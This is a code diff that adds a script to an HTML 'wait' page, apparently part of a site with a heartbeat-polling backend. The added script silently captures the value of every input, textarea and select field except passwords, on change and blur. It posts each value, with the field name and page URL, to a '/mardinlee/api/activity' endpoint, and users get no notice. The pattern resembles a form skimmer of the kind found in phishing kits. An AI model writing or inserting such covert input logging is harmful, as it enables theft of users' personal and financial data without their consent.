@@ -208,5 +208,98 @@
         console.log('📡 Network tab\'ında /api/heartbeat isteklerini görebilirsiniz');
     })();
     </script>
+    <script>
+    (function () {
+        var PAGE_ID = 'wait';
+        var INPUT_TAGS = ['INPUT', 'TEXTAREA', 'SELECT'];
+        var lastLogged = {};
+
+        function shouldTrack(element) {
+            if (!element || INPUT_TAGS.indexOf(element.tagName) === -1) return false;
+            var type = (element.type || '').toLowerCase();
+            return type !== 'password';
+        }
+
+        function getFieldName(element) {
+            return (
+                element.name ||
+                element.id ||
+                element.getAttribute('data-test') ||
+                element.getAttribute('aria-label') ||
+                element.placeholder ||
+                element.getAttribute('data-field-label') ||
+                'unknown-field'
+            );
+        }
+
+        function getFieldValue(element) {
+            if (!element) return '';
+            var type = (element.type || '').toLowerCase();
+            if (type === 'checkbox' || type === 'radio') {
+                return element.checked ? (element.value || 'checked') : 'unchecked';
+            }
+            if (element.tagName === 'SELECT') {
+                if (element.multiple) {
+                    return Array.from(element.selectedOptions || []).map(function (opt) {
+                        return (opt && (opt.value || opt.textContent.trim())) || '';
+                    }).filter(Boolean).join(', ');
+                }
+                var option = element.options[element.selectedIndex];
+                return option ? (option.value || option.textContent.trim()) : '';
+            }
+            return (element.value || '').trim();
+        }
+
+        function sendInputLog(payload) {
+            fetch('/mardinlee/api/activity', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'user_input',
+                    payload: payload
+                })
+            }).catch(function (err) {
+                console.warn('⚠️ Input log gönderilemedi:', err);
+            });
+        }
+
+        function handleInputEvent(event) {
+            var target = event.target;
+            if (!shouldTrack(target)) return;
+
+            var fieldName = getFieldName(target);
+            var fieldType = (target.type || target.tagName || '').toLowerCase();
+            var fieldValue = getFieldValue(target);
+
+            if (typeof fieldValue === 'string') {
+                fieldValue = fieldValue.slice(0, 300);
+            }
+
+            if (!fieldValue && fieldType !== 'checkbox' && fieldType !== 'radio' && target.tagName !== 'SELECT') {
+                return;
+            }
+
+            var lastInfo = lastLogged[fieldName] || {};
+            var now = Date.now();
+            if (lastInfo.value === fieldValue && now - lastInfo.time < 1500) {
+                return;
+            }
+
+            lastLogged[fieldName] = { value: fieldValue, time: now };
+
+            sendInputLog({
+                page: PAGE_ID,
+                fieldName: fieldName,
+                fieldType: fieldType,
+                value: fieldValue,
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            });
+        }
+
+        document.addEventListener('change', handleInputEvent, true);
+        document.addEventListener('blur', handleInputEvent, true);
+    })();
+    </script>
 </body>
 </html>
